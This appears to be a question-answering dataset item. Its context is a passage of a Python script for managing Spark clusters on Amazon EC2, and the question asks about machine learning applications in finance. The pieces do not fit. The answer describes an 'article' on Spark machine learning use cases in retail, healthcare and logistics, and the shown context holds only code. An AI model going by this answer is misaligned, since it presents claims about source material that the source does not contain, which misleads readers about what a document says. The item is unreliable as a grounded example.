stdin=subprocess.PIPE, stderr=subprocess.STDOUT)\n    proc.stdin.write(input)\n    proc.stdin.close()\n    status = proc.wait()\n    if status == 0:\n      break\n    elif (tries > 15):\n      raise RuntimeError(\"ssh_write failed with error %s\" % proc.returncode)\n    else:\n      print(\"Error {0} while executing remote command, retrying after 30 seconds\".format(status), file=sys.stderr)\n      time.sleep(30)\n      tries = tries + 1\n\n\ndef get_zones(conn, opts):\n  if opts.zone == 'all':\n    zones = [z.name for z in conn.get_all_zones()]\n  else:\n    zones = [opts.zone]\n  return zones\n\n\n# Gets the number of items in a partition\ndef get_partition(total, num_partitions, current_partitions):\n  num_slaves_this_zone = total // num_partitions\n  if (total % num_partitions) - current_partitions > 0:\n    num_slaves_this_zone += 1\n  return num_slaves_this_zone\n\n\ndef real_main():\n  (opts, action, cluster_name) = parse_args()\n  get_validate_spark_version(opts.spark_version, DEFAULT_SPARK_GITHUB_REPO)\n  try:\n    conn = ec2.connect_to_region(opts.region)\n  except Exception as e:\n    print(e, file=sys.stderr)\n    sys.exit(1)\n\n  if opts.zone == \"\":\n    opts.zone = random.choice(conn.get_all_zones()).name\n\n  if action == \"launch\":\n    if opts.slaves <= 0:\n      print(\"ERROR: You have to start at least 1 slave\", file=sys.stderr)\n      sys.exit(1)\n    if opts.resume:\n      (master_nodes, slave_nodes) = get_existing_cluster(\n          conn, opts, cluster_name)\n    else:\n      start_secs = time.time()\n      (master_nodes, slave_nodes) = launch_cluster(\n          conn, opts, cluster_name)\n      wait_for_cluster(conn, opts.wait, master_nodes, slave_nodes)\n      print(\"Provisioning took %.3f minutes\" % ((time.time() - start_secs) / 60.0), file=sys.stderr)\n      start_secs = time.time()\n      setup_cluster(conn, master_nodes, slave_nodes, opts, True)\n      print(\"Setup took %.3f minutes\" % ((time.time() - start_secs)/60.0), file=sys.stderr)\n\n  elif action == \"destroy\":\n    (master_nodes, slave_nodes) = get_existing_cluster(\n        conn, opts, cluster_name, die_on_error=False)\n    print(\"Terminating master...\", file=sys.stderr)\n    for inst in master_nodes:\n      inst.terminate()\n    print(\"Terminating slaves...\", file=sys.stderr)\n    for inst in slave_nodes:\n      inst.terminate()\n\n    if opts.delete_groups:\n      print(\"Deleting security groups (this will take some time)...\", file=sys.stderr)\n      group_names = [cluster_name + \"-master\", cluster_name + \"-slaves\"]\n      wait_for_cluster_state(\n          conn=conn,\n          opts=opts,\n          cluster_instances=(master_nodes + slave_nodes),\n          cluster_state='terminated'\n      )\n      attempt = 1;\n      while attempt <= 3:\n        print(\"Attempt %d\" % attempt, file=sys.stderr)\n        groups = [g for g in conn.get_all_security_groups() if g.name in group_names]\n        success = True\n        # Delete individual rules in all groups before deleting groups to\n        for group in groups:\n          print(\"Deleting rules in security group \" + group.name, file=sys.stderr)\n          for rule in group.rules:\n            for grant in rule.grants:\n                success &= group.revoke(ip_protocol=rule.ip_protocol,\n                         from_port=rule.from_port,\n                         to_port=rule.to_port,\n                         src_group=grant)\n\n        time.sleep(30)  # Yes, it does have to be this long :-(\n        for group in groups:\n          try:\n            conn.delete_security_group(group_id=group.id)\n            print(\"Deleted security group %s\" % group.name)\n          except boto.exception.EC2ResponseError:\n            success = False;\n            print(\"Failed to delete security group \" + group.name, file=sys.stderr)\n\n        # Unfortunately, group.revoke() returns True even if a rule was not\n        # deleted, so this needs to be rerun if something fails\n        if success: break;\n\n        attempt += 1\n\n      if not success:\n        print(\"Failed to delete all security groups after 3 tries.\", file=sys.stderr)\n        print (\"Try re-running in a few minutes.\", file=sys.stderr)\n\n  elif action == \"login\":\n    (master_nodes, slave_nodes) = get_existing_cluster(\n        conn, opts, cluster_name)\n    master = master_nodes[0].public_dns_name\n    print(\"Logging into master \" + master + \"...\")\n    proxy_opt = []\n    if opts.proxy_port!= None:\n      proxy_opt = ['-D', opts.proxy_port]\n    subprocess.check_call(\n        ssh_command(opts) + proxy_opt + ['-t', '-t', \"%s@%s\" % (opts.user, master)])\n\n  elif action == \"get-master\":\n    (master_nodes, slave_nodes) = get_existing_cluster(conn, opts, cluster_name)\n    print(master_nodes[0].public_dns_name)\n\n  elif action == \"stop\":\n    response = raw_input(\"Are you sure you want to stop the cluster \" +\n        cluster_name + \"?\\nDATA ON EPHEMERAL DISKS WILL BE LOST, \" +\n        \"BUT THE CLUSTER WILL KEEP USING SPACE ON\\n\" +\n        \"AMAZON EBS IF IT IS EBS-BACKED!!\\n\" +\n        \"All data on spot-instance slaves will be lost.\\n\" +\n        \"Stop cluster \" + cluster_name + \" (y/N): \")\n    if response == \"y\":\n      (master_nodes, slave_nodes) = get_existing_cluster(\n          conn, opts, cluster_name, die_on_error=False)\n      print(\"Stopping master...\", file=sys.stderr)\n      for inst in master_nodes:\n        if inst.state not in [\"shutting-down\", \"terminated\"]:\n          inst.stop()\n      print(\"Stopping slaves...\", file=sys.stderr)\n      for inst in slave_nodes:\n        if inst.state not in [\"shutting-down\", \"terminated\"]:\n          if inst.spot_instance_request_id:\n            inst.terminate()\n          else:\n            inst.stop()\n\n  elif action == \"start\":\n    (master_nodes, slave_nodes) = get_existing_cluster(conn, opts, cluster_name)\n    print(\"Starting slaves...\", file=sys.stderr)\n    for inst in slave_nodes:\n      if inst.state not in [\"shutting-down\", \"terminated\"]:\n        inst.start()\n    print(\"Starting master...\", file=sys.stderr)\n    for inst in master_nodes:\n      if inst.state not in [\"shutting-down\", \"terminated\"]:\n        inst.start()\n    wait_for_cluster(conn, opts.wait, master_nodes, slave_nodes)\n    setup_cluster(conn, master_nodes, slave_nodes, opts, False)\n\n  else:\n    print(\"Invalid action: %s\" % action, file=sys.stderr)\n    sys.exit(1)\n\ndef find_best_price(conn,instance,zone, factor):\n  last_hour_zone = get_spot_price(conn,zone,datetime.utcnow()-timedelta(hours=1),instance)\n  average_price_last_hour = sum(i.price for i in last_hour_zone)/float(len(last_hour_zone))\n  return average_price_last_hour*factor\n\ndef get_spot_price(conn,zone,start_date_hour,instance):\n    return conn.get_spot_price_history(start_time=start_date_hour.strftime(\"%Y-%m-%dT%H:%M:%SZ\"),end_time = datetime.utcnow().strftime(\"%Y-%m-%dT%H:%M:%SZ\"),instance_type=instance, product_description=\"Linux/UNIX\",availability_zone=zone)\n\ndef main():\n  try:\n    real_main()\n  except UsageError, e:\n    print(e, file=sys.stderr)\n    sys.exit(1)\n\n\nif __name__ == \"__main__\":\n  logging.basicConfig()\n  main()", "question": " What are some potential applications of machine learning in finance, according to the article?", "answer": " The article does not specifically mention potential applications of machine learning in finance. It discusses Spark, an open-source big data framework, and its use in Spark-based machine learning applications. It mentions potential use cases in domains like retail, healthcare, and logistics, but does not focus on finance."}
